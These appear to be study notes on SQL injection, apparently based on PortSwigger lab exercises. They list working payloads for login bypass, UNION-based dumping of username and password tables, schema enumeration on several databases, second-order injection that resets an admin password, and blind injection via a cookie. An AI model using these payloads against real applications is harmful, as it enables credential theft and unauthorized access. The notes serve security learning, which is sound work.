
- What is the impact of a successful SQLi attack?

> A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. \
Many high-profile data breaches in recent years have been the result of SQL injection attacks, leading to reputational damage and regulatory fines. \
In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.

> https://portswigger.net/web-security/sql-injection

# Process
1. Detect
    - -- is comment in SQL
    - Submitting the single quote character ' and looking for errors or other anomalies.
    - Submitting Boolean conditions such as OR 1=1 and OR 1=2, and looking for differences in the application's responses.
2. Exploit
    - Retrieving hidden data
    - Subverting application logic, Login
    - UNION Attack, Retrieving data from other database tables,
    - Examining the database
    - Blind SQLi
    - Second-order SQL injection

# Example
- Retrieving hidden data
    - api       https://insecure-website.com/products?category=Gifts
    - query     SELECT * FROM products WHERE category = 'Gifts' AND released = 1
    - atack
        - https://insecure-website.com/products?category=Gifts'--
        - https://insecure-website.com/products?category=Gifts' OR 1=1--
        - https://insecure-website.com/products?category=Gifts'
- Subverting application logic
    - query     SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
    - attack    admin'--
- UNION Attack
    - What is:
        - SELECT a, b FROM table1 UNION SELECT c, d FROM table2
    - api       https://insecure-website.com/products?category=Gifts
    - query     SELECT name, description FROM products WHERE category = 'Gifts' AND released = 1
    - atack
        - https://insecure-website.com/products?category=Gifts' UNION select username, password from users--
    - SQL injection UNION attack, determining the number of columns returned by the query
        - https://insecure-website.com/products?category=Gifts'ORDER BY 1--
        - https://insecure-website.com/products?category=Gifts'ORDER BY 2--
        - https://insecure-website.com/products?category=Gifts'ORDER BY 3--
        - https://insecure-website.com/products?category=Gifts'ORDER BY 4-- // Error
        - https://insecure-website.com/products?category=Gifts'UNION SELECT NULL, NULL, NULL
        - https://insecure-website.com/products?category=Gifts'UNION select username, password, NULL from users--
        - https://insecure-website.com/filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+from+users--
    - Oracle
        - dual table    /filter?category=Accessories'+UNION+SELECT+NULL,NULL+FROM+dual-- 
- Examining the database
    - attack
        - SELECT * FROM v$version
        - SELECT * FROM information_schema.tables
            - /filter?category=Gifts'+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables-- #users_numere
            - /filter?category=Gifts'+UNION+SELECT+COLUMN_NAME,NULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name+=+'users_numere'-- #username_kjovop,password_avppud
    - Oracle
        - /filter?category=Accessories'+UNION+SELECT+banner,NULL+FROM+v$version+UNION+SELECT+SELECT+version,NULL++FROM+v$instance--
        - GET /filter?category=Pets'+UNION+SELECT+TABLE_NAME,'aaa'+FROM+ALL_TABLES-- HTTP/2
        - GET /filter?category=Pets'+UNION+SELECT+COLUMN_NAME,'aaa'+FROM+ALL_TAB_COLUMNS+WHERE+TABLE_NAME='USERS_FPYMQY'-- HTTP/2
        - GET /filter?category=Pets'+UNION+SELECT+USERNAME_ZCCJRT,PASSWORD_ABIHWU+FROM+USERS_FPYMQY-- HTTP/2
    - MS Sql Server
        - /filter?category=Gifts'+UNION+SELECT+@@version,NULL#
- Second-order SQL injection
    - Create user
        - username: user1'; upsate users set password='123456' where user='admin'--
- Blind SQLi
    - cookie TrackingId=E3jzomp8qokGJ8KN' AND '1'='1